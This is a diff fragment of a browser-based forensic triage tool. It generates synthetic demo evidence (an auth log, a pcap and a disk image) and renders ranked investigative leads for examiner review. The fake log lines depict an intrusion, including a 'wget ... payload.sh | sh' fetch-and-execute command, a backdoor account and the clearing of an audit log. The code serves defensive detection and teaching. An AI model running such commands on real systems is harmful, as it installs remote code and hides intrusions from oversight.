+ L.push(`2026-11-04T02:14:21Z srv01 sshd[902]: Accepted password for root from ${ip} port 40990`,'2026-11-04T02:15:03Z srv01 sudo: root : COMMAND=/usr/sbin/useradd svc_backup','2026-11-04T02:16:40Z srv01 bash: wget http://198.51.100.7/payload.sh | sh','2026-11-04T02:17:12Z srv01 audit: EventID 1102 audit log was cleared by root');
+ const f1=new File([L.join('\n')],'auth_server01.log',{lastModified:1793758700000});
+ const pk=[],t0=1793758440,mk=(ts,s,d,dp,n)=>{const u=new Uint8Array(16+54+n),v=new DataView(u.buffer);v.setUint32(0,ts,true);v.setUint32(8,54+n,true);v.setUint32(12,54+n,true);u[28]=8;u[30]=69;v.setUint16(32,40+n);u[39]=6;u.set(s,42);u.set(d,46);v.setUint16(50,40000);v.setUint16(52,dp);pk.push(u)};
+ const a=[203,0,113,45],b=[10,0,0,5],c=[198,51,100,7];for(let p=1;p<=30;p++)mk(t0+p,a,b,p,0);for(let i=0;i<800;i++)mk(t0+120+i,b,c,443,1400);
+ const gh=new Uint8Array(24);gh.set([0xD4,0xC3,0xB2,0xA1,2,0,4,0]);gh[20]=1;const f2=new File([gh,...pk],'capture_gw.pcap',{lastModified:1793759000000});
+ const r=new Uint8Array(160000);for(let i=0;i<r.length;i+=65536)crypto.getRandomValues(r.subarray(i,Math.min(i+65536,r.length)));r.set([255,216,255,224],40000);r.set([137,80,78,71],90000);r.set([80,75,3,4],120000);
+ const f3=new File([r],'usb_dump.dd',{lastModified:1793760000000});ingest([f1,f2,f3])}
+nv.onclick=e=>{const v=e.target.dataset.v;if(!v)return;document.querySelectorAll('nav button,section').forEach(x=>x.classList.remove('on'));e.target.classList.add('on');$('#v-'+v).classList.add('on')};
+fi.onchange=e=>ingest([...e.target.files]);
+['dragover','dragleave','drop'].forEach(t=>drop.addEventListener(t,e=>{e.preventDefault();drop.classList.toggle('h',t==='dragover');if(t==='drop')ingest([...e.dataTransfer.files])}));
+function rl(){const L=S.leads||[];$('#v-lead').innerHTML=`<div class="c tw"><h3>Ranked investigative leads: decision support, examiner confirms or dismisses</h3><table><tr><th>Lead</th><th>Pri</th><th>Entities</th><th>Window (UTC)</th><th>Events</th><th>ATT&amp;CK</th><th>Why flagged</th><th>Examiner review</th></tr>${L.map(l=>`<tr><td class="m">${l.id}</td><td><b>${l.pri}</b></td><td class="m">${esc(l.entities.slice(0,4).join(', '))}</td><td class="m">${iso(l.start)}<br>${iso(l.end)}</td><td>${l.n}</td><td class="m">${esc(l.techniques.join(', '))}</td><td>${l.reasons.map(esc).join('<br>')}<br><span class="m">${esc(l.refs.slice(0,3).join(' · '))}</span></td><td>${rv({id:l.id,file:'*lead*'})}</td></tr>`).join('')||'<tr><td colspan="8">No leads yet.</td></tr>'}</table></div>`}
+const _r0=render;render=function(){_r0();rl()};render();
+</script></body></html>
